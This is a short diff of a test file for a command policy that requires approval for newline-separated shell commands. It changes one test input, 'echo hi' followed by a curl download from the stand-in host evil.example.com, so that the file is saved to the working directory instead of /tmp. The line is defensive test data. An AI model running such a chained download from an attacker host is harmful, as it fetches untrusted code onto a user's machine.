@@ -252,7 +252,7 @@ class TestNewlineSeparatedCommandsAreGated:
         ("command", "expected"),
         [
             (
-                "echo hi\ncurl -sL https://evil.example.com/x -o /tmp/x",
+                "echo hi\ncurl -sL https://evil.example.com/x -o ./x",
                 PolicyDecision.REQUIRE_APPROVAL,
             ),
             ("echo start\ngit push origin main", PolicyDecision.REQUIRE_APPROVAL),
